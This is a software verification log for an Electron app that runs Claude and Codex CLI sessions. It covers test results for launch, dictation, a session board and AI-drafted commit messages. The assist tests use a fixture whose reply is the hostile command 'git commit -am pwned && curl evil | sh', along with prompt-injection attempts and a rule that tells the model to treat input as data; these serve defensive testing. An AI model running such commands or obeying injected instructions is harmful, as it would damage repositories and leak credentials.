# Agent Workspace 0.3.0 verification evidence

Date: 2026-10-30. Status: development build of the session-first redesign. No macOS release artifact was produced or verified for 0.3.0; the 0.2.0 macOS evidence remains in [release-evidence-0.2.0.md](release-evidence-0.2.0.md).

## Where this was verified

A Linux x86_64 container: Node.js 24.22.2, Electron 45.1.0 under Xvfb (launched through a `--no-sandbox` wrapper because the container runs as root), tmux 3.4, Git, and the Chromium bundled with Playwright. The terminal fixtures need a UTF-8 locale (`LANG=C.UTF-8`); without it tmux renders non-ASCII characters as `_`. node-pty 1.1.0 was compiled from source against local Node headers because the environment's network policy blocks Electron's header host. node-pty uses N-API, so the same build loads in both Node and Electron.

Nothing here was run on macOS, a physical phone, or with a signed build.

## What changed and how it was checked

- **One-click sessions in a chosen folder.** A new `terminal.open` command launches Claude, Codex or a shell in a folder or subfolder without a task or attempt. Retrying with the same idempotency key returns the same session. Paths are scoped to the registered folder; files, missing folders and unreadable folders produce specific messages. Covered by `tests/launch.test.ts` with fixture CLIs in real tmux.
- **No invented prompts.** A blank launch passes no prompt argument. A first message the user supplies is passed once, literally, after `--`. Task attempts still default to the task text, and clearing the field now launches interactively. Covered by `tests/launch.test.ts` and `tests/stream.test.ts`.
- **Startup failures are visible.** The private tmux server sets `remain-on-exit`. When a process ends, its final screen and exit status are saved as a transcript before the tmux session is removed. Previously, a CLI that exited at startup produced a raw `set-option` tmux error, lost its own message, and left the launch receipt unresolved ("Launch outcome unknown"). A probe against 0.2.0 reproduced this, and the launch test now checks the fixed behaviour. A deliberate **End** keeps the old behaviour: no transcript.
- **Agent status.** When the installed Claude CLI lists `--settings` and `--session-id` in `--help`, each Claude session gets:
  - its own conversation ID;
  - per-session hooks that write running, needs-you or done into a tmux pane option, which the core reads every 2 seconds.

  No global CLI configuration is changed. In the fixture test, a CLI ran the exact `Notification` hook command it was given inside a real tmux pane, and the session reported `needs`. Codex and shell sessions report running or ended only.
- **Resume.** An ended Claude session relaunches with `--resume <conversation id>` in its original folder. For Codex, **Resume…** opens Codex's own `codex resume` picker. The Codex path is unverified because no Codex CLI was available.
- **Desktop folder navigation.** A new owner-only `workspace:browse` IPC lists host folders for the in-app browser. The remote gateway has no route to it, and it still rejects `project.add` and the new `project.hide`. Covered by the folder-listing test in `tests/services.test.ts` and gateway assertions in `tests/server.test.ts`.
- **CLI discovery.** The desktop app adds the PATH from the user's login shell, plus `~/.volta/bin` and `~/.bun/bin`, so CLIs installed through nvm, Volta or Bun are found when the app is opened from the Dock. This is untested on macOS.
- **Schema.** The workspace database moves from version 1 to 2 through an explicit migration. Existing rows are unchanged. Older builds refuse version 2 data rather than misread sessions that have no attempt.

## Automated results

- `npm run typecheck`: passed.
- `npm test`: 31 of 31 passed. This is the original 29, plus the folder-launch test and the owner folder-listing test.
- Electron desktop checks were rewritten for the new interface where they relied on the task-first interface:

  | Check | Result |
  | --- | --- |
  | `smoke` | passed |
  | `smoke:ui` | 9 checks passed |
  | `verify:desktop` | 4 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |
  | `verify:remote-desktop` | 7 checks passed |

  In the back-to-back final pass, `verify:terminal` timed out once at its deliberately blocked-renderer resync step, then passed all 7 checks in 3 of 3 standalone reruns.
- Browser check: `verify:mobile` passed 14 checks against the headless host with Playwright Chromium. Phone screenshots and `mobile-verification.json` in `screenshots/remote/` were regenerated for 0.3.0.
- Packaged check: `smoke` and `smoke:ui` passed against an unpacked Linux package (`electron-builder --linux dir`, `app.isPackaged === true`, version 0.3.0).

Results are in [screenshots/desktop/verification.json](screenshots/desktop/verification.json). Desktop screenshots of the new interface are in `screenshots/desktop/`; each was inspected.

## Live provider check

The real Claude Code 2.1.314 CLI was opened blank in a disposable folder by the core, with an isolated empty `HOME` and no credentials. It accepted `--session-id` and the hook `--settings`, and showed its own first-run screen in the chosen subfolder. Nothing was typed or submitted, and no model usage occurred. A full model turn firing the hooks inside real Claude Code was not run. The Codex CLI was not installed, so no live Codex check was possible.

## Not run for 0.3.0

macOS packaging (`npm run package`), `verify:mobile-webkit`, `verify:server-release`, `verify:linux-server` (Docker), and the opt-in live scripts `verify:providers` and `verify:remote-provider`.

## Reproduction notes

Browser scripts accept `WORKSPACE_BROWSER=/path/to/chromium` as an alternative to installed Google Chrome. Desktop scripts accept `WORKSPACE_APP_EXECUTABLE` for a packaged or wrapped Electron executable. Tests still default to `/opt/homebrew/bin/tmux` in places; on Linux, point that path at the system tmux or set `WORKSPACE_TMUX`.

## Roadmap phase 0, 1a and 1b (after 0.3.0)

Built by two sub-agents in isolated worktrees and merged; results below are from the merged tree in the same Linux container.

- **Phase 0.**
  - Named migration registry: v1, v2, and v3 `roadmap_01_owner_utilities`.
  - Consistent SQLite backup before upgrading a non-empty store, keeping the newest 3.
  - A store newer than supported is rejected before any write.
  - A central command policy marks every command owner-only or remote, and the gateway validator follows it.
- **Phase 1a.**
  - `session.rename`, with a revision check and sanitized plain text, allowed remotely.
  - A shared safe-paste helper.
  - Local screenshot paste:
    - An owner-only IPC reads the clipboard image with Electron 45's `clipboard.read()`, validates it, and re-encodes it as PNG.
    - The bytes reach the core over an internal message, never a public command.
    - The core writes a 0600 PNG into a 0700 per-session folder and pastes the escaped path without Enter.
    - Saved images are cleaned up 7 days after the session ends.
- **Phase 1b.** Keep-awake:
  - Off by default and owner-only.
  - Holds one `prevent-app-suspension` blocker while a local Claude session reports fresh working activity.
  - Hooks stamp `@aw_activity_at`, which gives a 20-minute lease. A repeated snapshot never renews it.
  - Released on needs/done/exit/unknown, core loss, turning the setting off, and quit.
- **Exit status is best effort.** Under CPU load, tmux sometimes marks a pane dead without ever recording its exit status. Plain tmux reproduced this in 1 of 20 cases. The core waits up to 1 second for it; the saved final screen is unaffected.

Results:
- `npm test` passed 52 of 52, twice.
- These app checks passed:

  | Check | Result |
  | --- | --- |
  | `smoke` | passed |
  | `smoke:ui` | 9 checks passed |
  | `verify:image-paste` | 6 checks passed |
  | `verify:keep-awake` | 9 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |
  | `verify:desktop` | 4 checks passed |
  | `verify:remote-desktop` | 7 checks passed |
  | `verify:mobile` | 14 checks passed |

Not verified:
- Native clipboard reads on macOS, Windows or Wayland. Only Linux X11 under Xvfb, with synthetic paste events, was tested.
- Real system sleep prevention. Only Electron's blocker state was checked.
- The real Claude CLI running the timestamp hook commands. Fixture CLIs ran them.
- Interrupting Claude with Ctrl+C: the blocker is then released only when the 20-minute lease ends.
- Upgrading a real user database from an older version (covered by fixtures only).

## Roadmap phase 2a: local English dictation (after phases 0, 1a and 1b)

Built in an isolated worktree on the merged phase 0/1a/1b tree and checked in the same Linux container.

**Owner decisions.** These replace the roadmap's original preview design:

- English only, using English Whisper models.
- "Type as I talk": each phrase is typed into the terminal when the speaker pauses. There is no review step.
- Enter, CR, LF and control or escape bytes are never sent. The user submits.

**Engine: sherpa-onnx, not whisper.cpp or Transformers.js.** These were checked before choosing:

- **Transformers.js (option A).** Its ONNX Whisper models are hosted only on huggingface.co, which this environment's egress policy blocks, so real speech-to-text could not be shown with it here. It would also add `sharp` and two ONNX Runtime builds.
- **whisper.cpp (option B).** It needs a native build for each platform, and its ggml models are also hosted on Hugging Face.
- **sherpa-onnx (chosen).**
  - `sherpa-onnx-node` 2.0.1 (Apache-2.0) ships prebuilt N-API addons for macOS, Linux and Windows on x64 and arm64, with ONNX Runtime (MIT). There is no node-gyp or electron-rebuild step; one build loads in both Node and Electron.
  - Its Whisper `tiny.en`/`base.en` int8 ONNX exports are published as GitHub release assets, which were reachable here.

**Where inference runs.** It runs in a separate Electron utility process (`dist/desktop/dictation-worker.mjs`), never in the sandboxed renderer. The renderer CSP is unchanged; the AudioWorklet module is a same-origin file.

**Models.**

| Model | Archive | Archive SHA-256 | Kept on disk |
| --- | --- | --- | --- |
| tiny.en | 118,071,777 bytes | `2bd6cf965c8bb3e068ef9fa2191387ee63a9dfa2a4e37582a8109641c20005dd` | int8 encoder, int8 decoder, tokens (103.6 MB) |
| base.en (default) | 208,576,005 bytes | `475bc7052ce299c007f6d5d5407ba8601f819a2867f6eecee510ed17df581542` | int8 encoder, int8 decoder, tokens (160.6 MB) |

- **Source.** `https://github.com/k2-fsa/sherpa-onnx/releases/download/asr-models/sherpa-onnx-whisper-{tiny,base}.en.tar.bz2`.
- **Where the checksums came from.** The archive and per-file SHA-256 values were computed from downloads on 2026-10-30. They were not cross-checked against a digest published by the project, because the GitHub API for that repository was not reachable from this session.
- **What is pinned.** The download size limit, the archive hash and each extracted file's size and hash.
- **Before use.** Every file is re-hashed before a model is loaded.
- **Licenses.** The Whisper weights are MIT and the export tooling is Apache-2.0.

**Download and install.** A download happens only after the owner clicks **Download English speech model** in **Voice dictation**. The install then:

1. Streams the archive to a 0600 temporary file and enforces the pinned size.
2. Verifies the archive's SHA-256.
3. Unpacks only the three expected entries, using a minimal ustar reader and `unbzip2-stream` (MIT), into a staging folder.
4. Verifies each file, then renames the folder to `userData/models/<id>`.

Nothing is kept after a failure. In the app, `net.fetch` in the utility process performs the download.

**Privacy.**

- Audio is held only in memory: renderer PCM, then IPC, then the worker.
- No audio file is written; a script check confirms none appears in the data folder.
- The UI states that the agent's CLI may send the text to its provider after Enter.

**Security.**

- **IPC channel.** `workspace:dictation` (`status`, `downloadModel`, `start`, `phrase`, `stop`) is owner-only: only the main frame of the window. Unknown fields are rejected.
- **Phrase bounds.**
  - Phrases are 16-bit PCM of at most 30 s.
  - Recording IDs are issued by main, with increasing sequence numbers.
  - At most 4 phrases may be in flight.
  - Each phrase has a 30 s inference timeout; on timeout the worker is killed.
  - A recording lasts at most 30 minutes.
- **Model setting.** It goes through the existing owner-only `settings.read/write` with a new `dictationModel` key. The core accepts only `base.en` or `tiny.en`, and the gateway still rejects `settings.*`.
- **Permissions.** New permission handlers allow `media` only when every requested type is audio, from the app window's main frame.
  - Notifications and clipboard writes keep working from that frame.
  - Video, other windows and frames, and all other permissions are denied.
- **macOS packaging.** The build config adds `NSMicrophoneUsageDescription` and `build/entitlements.mac.plist`, which includes `com.apple.security.device.audio-input` for hardened-runtime signing. The current macOS build is unsigned, so the entitlement is unused until signing.

**Segmenting and insertion.**

- **Capture.** `getUserMedia` (audio only) feeds an AudioWorklet, with a ScriptProcessor fallback. Audio is resampled to 16 kHz mono with a box low-pass filter.
- **Phrase detection.** An energy VAD over 20 ms frames uses an adaptive noise floor. A phrase ends after 700 ms of silence or at a 15 s cap.
- **Cleaning.** Whisper non-speech annotations (`[BLANK_AUDIO]`, `(music)`, `[ Silence ]`, `*laughs*`, `♪`) are dropped. Text then passes through the shared `sanitizePasteText`, with whitespace collapsed and one space between phrases.
- **Typing.** Text is typed with xterm's `terminal.paste()`, which is bracketed-paste aware.
- **Destination.** The destination `{sessionId, generation, viewerId}` is fixed at start and rechecked for every phrase. A change stops dictation, and untyped text appears in a panel with **Copy**.
- **What stops dictation and releases the microphone tracks:**
  - Stop, the shortcut, or a second start.
  - Window blur or hide (but not while the first permission prompt is open).
  - A viewer change, session end or detach.
  - Errors, and the 30-minute limit.

Results:

- `npm run typecheck` passed.
- `npm test` ran 65 tests: 64 passed and 1 opt-in test was skipped. That is the original 52 plus 12 in `tests/dictation.test.ts` covering:
  - resampler;
  - VAD silence, clicks, pauses, the 15 s cap and the noise floor;
  - Int16 conversion;
  - non-speech filtering and fuzzed sanitizer output (no CR, LF, ESC, C1 or bidi characters);
  - phrase spacing and destination checks;
  - IPC payload bounds;
  - model install: checksum failures, file tampering, size limit, HTTP errors and nothing left behind;
  - the main-side service with a fake worker.

  Dictation-model assertions were added to `launch.test.ts` and `server.test.ts`.
- **Opt-in real engine** (`WORKSPACE_TEST_REAL_DICTATION=1`). It downloaded the real tiny.en archive from GitHub through the proxy (Node `fetch`), verified and unpacked it, and transcribed an `espeak-ng` clip of "Hello world. Please open the readme file." The result was "The low world, please open the read me file." in about 0.3–0.4 s. espeak's robotic "hello" is heard as "the low"; the rest is exact. The test passed.

  The same base.en files transcribed the sherpa test clip `0.wav` exactly ("After early nightfall the yellow lamps would light up here and there the squalid quarter of the brothels.") in about 1.0 s.
- `verify:dictation` passed 12 checks, against the real app under Xvfb with Chromium's fake microphone playing an `espeak-ng` WAV:
  - The real tiny.en model was installed through the settings dialog, in two runs:
    - over the network from GitHub with Electron `net.fetch`, in 34 s;
    - from a local copy of the release asset, in 30 s, still checked against the pinned hash.
  - The words were typed at a shell prompt and not executed: "The Long World Please open the Read Me file and list every test in the project." Pressing Enter in the test then made the shell echo the line once.
  - Capture used the AudioWorklet path.
  - Stop, button, shortcut, window blur and the canvas header all start or stop dictation, and the microphone is released each time.
  - Switching session mid-phrase typed the partial text nowhere and showed it with Copy.
  - A foreign window was refused every dictation action and `getUserMedia` (NotAllowedError), and the app window could not open a camera.
  - Malformed payloads were rejected.
  - The data folder contained no audio file.

  It also passes with `WORKSPACE_VERIFY_DICTATION_FIXTURE=1`, which uses a fixture transcriber.
- `verify:remote-desktop` passed 7 checks. It now also asserts that a paired browser has no dictation API, no dictation controls and no microphone.
- These checks were re-run and passed:

  | Check | Result |
  | --- | --- |
  | `smoke` | passed |
  | `smoke:ui` | 9 checks passed |
  | `verify:image-paste` | 6 checks passed |
  | `verify:keep-awake` | 9 checks passed |
  | `verify:desktop` | 4 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |

- Screenshots are in `screenshots/desktop/`: `dictation-settings.png`, `dictation-model-ready.png`, `dictation-typed.png`, `dictation-canvas.png` and `dictation-untyped.png`.

The test-only switches are environment variables that change nothing unless set:

- `WORKSPACE_TEST_FAKE_MIC` adds Chromium's fake-device switches. It deliberately does not add `use-fake-ui-for-media-stream`, which would bypass the permission handler under test.
- `WORKSPACE_TEST_DICTATION_TEXT` selects the fixture transcriber.
- `WORKSPACE_TEST_DICTATION_ARCHIVE` reads a local archive instead of downloading. The pinned checksum still applies.

Not verified:

- **macOS.**
  - The microphone consent prompt and hardened-runtime signing with the audio-input entitlement.
  - Loading `sherpa-onnx-darwin-*` from an unpacked asar in a packaged app. The addon's own loader mentions `DYLD_LIBRARY_PATH` on macOS.
- **Windows and Linux arm64 builds.**
- **Real microphones.** Real voices, accents and noisy rooms; the VAD thresholds were tuned on synthetic and espeak audio only. PipeWire or PulseAudio capture was not tested.
- **Performance.** base.en latency on low-end CPUs, and speech recognition keeping up during long continuous speech.
- **Packaged builds.** Neither `electron-builder` packaging with the new `asarUnpack` entry nor packaged-app dictation was run.
- **Third-party notices.** The sherpa-onnx npm packages ship no LICENSE or NOTICE file. A packaged release still needs the Apache-2.0 and ONNX Runtime MIT notice texts added.

## Live session board (after phase 2a)

Built in an isolated worktree on the phase 2a tree and checked in the same Linux container. Designed only from this repository.

**What it is.** **Board** now opens on **Sessions** (a **Sessions | Tasks** switch; Tasks is the unchanged task board). Each session in the folder is a card in one of the folder's lanes. Lanes default to Up next, Working, Review and Done. The owner and a paired browser can rename them, add up to six, and remove a lane only when no card shows in it. A session without a placement is shown, not written, in Working while open and in Done once ended (falling back to the first or last lane when those were removed). Cards show provider, name, the existing status badge, folder-relative location, model and relative last activity. Needs you cards are highlighted. Ended cards are dimmed with **Resume** (Claude with a conversation ID and no nonzero exit) and **New here**; both reuse the existing App resume/restart launch, then file the new session in the ended card's lane and open its live card. Ended cards beyond the 20 most recent per lane wait behind **Show more**.

**Commands.**

- `session.place {sessionId, generation, lane, order?, placementRevision}`: generation and the current `placementRevision` are required; the lane must exist; ended sessions can be placed. An omitted order appends after the lane's last card. It writes only `lane`, `laneOrder` and `placementRevision` on the session record and emits a snapshot. It never attaches, detaches, resizes, sends input or restarts.
- `lane.rename`, `lane.add`, `lane.remove {projectId, …, revision}`: a per-folder `boardLanes` record `{projectId, lanes, revision}` with plain one-line names of at most 40 characters.
- All four are `remote` in `COMMAND_POLICY` with exact gateway field lists. `publicSession` projects `lane`, `laneOrder` and `placementRevision`; gateway snapshots carry only shared folders' `boardLanes`. Owner-only commands are unchanged.

**Interaction.** HTML5 drag between lanes on desktop, plus a **Move to…** menu on every card for keyboard and touch. **+** on a lane starts Claude, Codex or a shell through the existing `terminal.open` launch path, then places the returned session. Clicking a card opens a live card: the existing `SessionView` (real `TerminalView` attached as an ordinary viewer, rename, Interrupt/End with the existing confirmation, Resume/New) plus a lane picker. Closing it, or Esc outside the terminal, unmounts the view, which detaches only that viewer. Esc inside the terminal still goes to the program. At 900px and below the lanes scroll horizontally with snap and the live card is full-screen.

**Schema.** Migration v4 `board_lanes` is additive: no table or row changes, the same backup and newer-version rejection. A v3 store upgrades with records unchanged and a `workspace-v3-*` backup. The roadmap reserved v4 for `roadmap_02_conversations`; that and later reservations move to the next unused number, as the roadmap's migration rule requires.

Results:

- `npm run typecheck` passed.
- `npm test`: 70 tests, 69 passed, 1 opt-in skipped. New `tests/board.test.ts` (5 tests):
  - shared lane defaults, fallback lanes and lane-name cleaning;
  - placement in a real tmux shell: revision, stale revision, missing or wrong generation, unknown lane, invalid order, explicit and appended order; the shell's own `$$` and the tmux pane PID are unchanged and the same attached viewer still types into it; lane rename/add (six maximum)/remove-only-when-empty, including a lane occupied only by an unplaced open session; ended sessions can be placed; placements and lanes persist across a core restart with the same PID;
  - v3 to v4 migration keeps a titled Claude session, project and owner setting unchanged and backs up v3;
  - remote validation of the four commands' fields;
  - a real gateway in front of a real core: a paired browser places and renames lanes in the shared folder, gets the projected session (no `backendSocket`), is refused with "Project access denied" for the unshared folder's session and lanes, sees no other folder's lane names, and is still refused `project.add`, `project.hide` and `settings.write`.

  The registry test and both newer-version rejection tests now use version 5 as "newer".
- `verify:board` (new, Electron under Xvfb with a fixture Claude CLI that reports needs-you through its per-session hook) passed 10 checks: two shells started from the folder; Sessions is the default mode with four lanes and nothing written for unplaced cards; dragging a card to Review keeps the tmux pane PID, the shell's own PID and generation, and the terminal still accepts input; Move to…; inline lane rename; live card typing reaches the same shell, rename and lane picker work, closing by button or Esc leaves the same process running; **+** in a lane starts a shell placed there; a Claude started in Up next shows a highlighted Needs you card; after End, the dimmed card offers Resume and New here, Resume keeps the lane and opens the new live card, and an ended shell offers only New here; the Tasks switch still shows the task board.
- `verify:mobile` passed 15 checks (one new) on 390×844 touch Chromium against the headless host: lanes scroll horizontally with snap and the body does not overflow; **Move to…** by tap places the card through the gateway; a tap opens a full-screen live card with the terminal command bar; closing keeps the same running session (the script's later same-PID check after a host restart still passes).
- Re-run and passed after updating only the board-mode selector where a script opened the task board (`smoke:ui`, `verify:workflows`, `verify:lifecycle`, `verify:mobile`):

  | Check | Result |
  | --- | --- |
  | `smoke:ui` | 9 checks passed |
  | `verify:workflows` | 15 checks passed |
  | `verify:lifecycle` | 6 checks passed |
  | `verify:terminal` | 7 checks passed |
  | `verify:remote-desktop` | 7 checks passed |

- Screenshots, each inspected: `screenshots/desktop/board-sessions.png`, `board-live-card.png` and `board-phone.png`. `screenshots/remote/phone-board.png` and `mobile-verification.json` were regenerated because the board header changed.

Not verified: macOS, a physical phone or touch drag (phones use Move to…; HTML5 drag is desktop only), a real Claude or Codex CLI on the board (a fixture Claude was used), Codex resume from a card (Codex has no card Resume; the live card keeps SessionView's existing Codex **Resume…**), card reordering within a lane by drag (drops append; `order` is accepted by the command and tested in core), and `verify:mobile-webkit` (not run; WebKit is not installed here, and its **New task** step may need the same **Tasks** selector).

## Roadmap section 5: opt-in AI commit messages and session names (after the live session board)

Built in an isolated worktree on `claude/jolly-clarke-oo3rm5` at `e25c469` and checked in the same Linux container. Designed only from this repository, the roadmap, and the installed `claude --help` (2.1.314) plus public CLI documentation. No schema migration: the two new owner settings are `ownerSettings` JSON records (`assistProvider`, default `""` meaning off; `assistModel`, default `""`).

**Surfaces.** Core commands `assist.status`, `assist.preview`, `assist.suggest` and `assist.cancel` are `owner` in `COMMAND_POLICY`, so the gateway refuses them. The desktop reaches them only through the new D-only `workspace:assist` channel (`status`, `configure`, `previewCommit`, `stagedHash`, `suggestCommit`, `previewName`, `suggestName`, `cancel`), behind the existing main-frame owner check, with exact field lists. `workspace:invoke` refuses `assist.*` and writes to the two assist settings, so turning the feature on always goes through `configure`, which requires `acknowledged: true`. Suggestions bypass the core's mutation queue (they only read Git and settings), so a slow provider never holds up other work and cancel never waits behind a run.

**Runner (`src/core/assist.ts`).** A dedicated runner, not `run()`: `spawn` without a shell in a new process group, from a fresh `0700` `os.tmpdir()/aw-assist-*/work` folder that starts empty and is deleted afterwards. The previewed text goes on stdin; argv carries no user content. The environment is an allowlist (HOME, USER, PATH, locale, XDG folders, proxy and CA variables, plus the selected provider's own auth/config variables), so agent-control, `AW_*`/`WORKSPACE_*`, `TMUX`, `SSH_AUTH_SOCK`, Git and the other provider's keys are never passed. It sets `NO_COLOR=1`, `TERM=dumb` and a `TMPDIR` inside the scratch folder. Limits: 60 s and 256 KB of stdout; on timeout, cancel, overflow or exit the whole process group gets `SIGKILL`. One request per click, no retry, one run at a time. Before running, the executable is re-probed (keyed by realpath, inode, size and mtime); a changed binary that no longer lists every flag is refused.

**Claude flags, each checked against the installed help at runtime (fail closed).** `--print --safe-mode --restricted --tools "" --disallowedTools mcp__* --strict-mcp-config --mcp-config <app-written {"mcpServers":{}}> --permission-mode dontAsk --permission-prompts none --no-session-persistence --disable-slash-commands --no-chrome --output-format json [--model M]`. The installed `/opt/node22/bin/claude` (2.1.314, realpath `/opt/claude-code/bin/claude`) lists all fourteen requirements, so the probe reports it ready. Only the JSON result's `result` string is used; `is_error` or a non-success subtype is reported as an error.

**Codex flags (unverified here).** `codex -a never exec --sandbox read-only --ignore-user-config --ignore-rules --ephemeral --skip-git-repo-check --color never --output-last-message <scratch file> [--model M] -`. Codex is not installed in this container. The adapter is unavailable unless `codex --help` lists `--ask-for-approval … never` and `codex exec --help` lists every other flag. Even then it is shown as "Isolation unverified", because this app has not checked that Codex's MCP, network and file reads are actually restricted. No bypass or unsafe flag is ever used.

**Input and output.** The commit preview reads only the index and HEAD: per-file `git diff --cached --no-ext-diff --no-textconv --no-color --no-renames`. Binary files are listed but never included, files are added in order until 60 KB, and every omission (binary, excluded, size limit, file limit) is listed and named in the prompt. The staged fingerprint is SHA-256 of `HEAD` plus `git diff --cached --raw -z --no-abbrev`; it is re-read after the snapshot and a change aborts. `assist.suggest` recomputes the input and refuses unless both its hash and the staged fingerprint equal what the owner previewed. The material sits between unguessable markers with a fixed instruction to treat it as data. Output is stripped of ANSI/OSC sequences, control, zero-width and bidi characters and code fences. A commit draft is a subject of at most 72 characters plus at most 30 body lines; a name is one plain line of at most 60 characters. The draft only fills the commit box, and replacing typed text asks first. Name context is the task title/description, the first message recorded with the launch, and the folder name, each ticked by the owner; terminal output is never read. Accept calls the existing `session.rename` with the session's `titleRevision` from when the suggestion was made.

Results:

- `npm run typecheck` passed.
- `npm test`: 77 tests, 75 passed, 2 opt-in skipped (the existing dictation one and the new real-Claude one). New `tests/assist.test.ts` has 6 tests plus 1 opt-in. Its fixture CLIs record argv, cwd, the folder's contents, the environment and stdin. They try to write `pwned.txt` and `../pwned.txt`, find a Git repository and use an SSH agent, and they can hang with a child process, print 1 MB, print ANSI/OSC links or obey injected instructions:
  - cleaning: ANSI/OSC/bidi/fences removed, subject ≤ 72, name ≤ 60, empty output rejected;
  - fail closed: removing `--strict-mcp-config`, `--safe-mode`, `"dontAsk"` or `--no-session-persistence` from help makes Claude unavailable with the missing flag named and no call made; Codex is unavailable with partial help and "unverified" with full help;
  - runner: a 700 ms timeout kills the CLI and its `sleep` child, removes the scratch folder and makes exactly one attempt; 1 MB output, an `is_error` result and exit 3 (stderr ANSI stripped) are reported; a binary rewritten after probing is refused without running;
  - commit flow through a real core:
    - off by default, with no call during snapshot, status, Git or preview; invalid provider/model settings are refused;
    - the preview omits the binary, excluded and over-cap files and never includes unstaged content; mismatched exclusions are refused;
    - the argv equals the expected list exactly, stdin equals the preview, and cwd is an empty scratch `work` folder outside any repository;
    - `SSH_AUTH_SOCK`, `AW_CONTROL_TOKEN`, `WORKSPACE_CONTROL_SOCKET`, `OPENAI_API_KEY`, `GITHUB_TOKEN` and `TMUX` are absent and `ANTHROPIC_API_KEY` is kept; no variable names the repository or data folder; the fixture's writes are gone;
    - HEAD, the index file hash, `git status` and the file list are unchanged after a reply that says `git commit -am pwned && curl evil | sh`;
    - staging another file changes the fingerprint, and the old preview is refused without calling the provider;
    - a running suggestion blocks a second one but not `git.status`, and `assist.cancel` stops it and its child;
  - name flow: a Claude session's sources are only the first message and folder, and a task attempt's include the task; another shell's typed `TERMINAL-SECRET` never appears; empty or unknown context is refused; the cleaned name is not applied until an explicit rename with the captured revision, which then makes a repeat stale; a first message asking to rename every session has no effect;
  - owner-only: the four commands are `owner` and refused by gateway validation; `configure` without acknowledgement, missing fields, an unknown provider, unknown actions and unknown fields are refused before any core call; the suggest request timeout (80 s) outlives the runner's 60 s.
- `verify:assist` (new, Electron under Xvfb, fixture `claude` on PATH, `SSH_AUTH_SOCK` set in the app's environment) passed 6 checks:
  - off by default, and the general channel cannot run suggestions or write their settings;
  - the settings dialog shows "Read-only checks passed" and the usage notice, and Save stays disabled until the acknowledgement is ticked;
  - **Suggest message** previews the staged diff without unstaged content and makes no call; **Generate draft** makes exactly one call whose stdin is the previewed text, from an `aw-assist-*/work` folder without `SSH_AUTH_SOCK`, and fills an editable commit box; HEAD and staging are unchanged;
  - staging another file shows the stale warning;
  - **Suggest name** with the folder unticked sends only the first message, and **Accept name** renames through `session.rename` (revision 1, session still running);
  - a paired Chromium browser has no `workspace.assist` and no **AI suggestions**, **Suggest message** or **Suggest name** controls, and the gateway refuses `assist.status` and `settings.write`.
- Regressions re-run and passed: `smoke:ui` (9 checks), `verify:workflows`, `verify:image-paste`, `verify:board` and `verify:desktop` (4 checks).
- Screenshots, each inspected: `screenshots/desktop/assist-settings.png`, `assist-commit.png` (preview of the exact text), `assist-commit-stale.png` (edited draft with the stale warning) and `assist-name.png`.

**Real CLI.** The opt-in test (`WORKSPACE_TEST_REAL_ASSIST=1`) was not run. One real request was made by mistake while checking that the installed Claude 2.1.314 accepts this exact argv. The CLI was run with a cleared environment and an empty `HOME`, on the assumption that it could not sign in. In this container it still authenticated and answered the prompt "hi": exit 0, a JSON result, a reported cost of $0.0049 on Sonnet, and the empty working folder still empty afterwards. That confirms the argv parses and runs; `--bogus-flag` and an invalid `--permission-mode` were rejected as controls. It does not show tool or MCP isolation against a hostile prompt.

Not verified:

- That Claude actually refuses tool use, MCP and file access under these flags against a hostile prompt. The fixture can only check what the app passes. The runner adds no OS sandbox and would not contain a malicious binary; it relies on the CLI's own restrictions.
- Interaction with managed policy.
- Codex, entirely (not installed here).
- macOS. The runner uses POSIX process groups; Windows shows suggestions as unavailable.
- OAuth refresh writes by the CLI to its own configuration.
- An unborn-HEAD repository in the UI. The fingerprint handles a missing HEAD, but no test covers it.
- Provider terms for this use of the CLI, which remain the owner's decision.
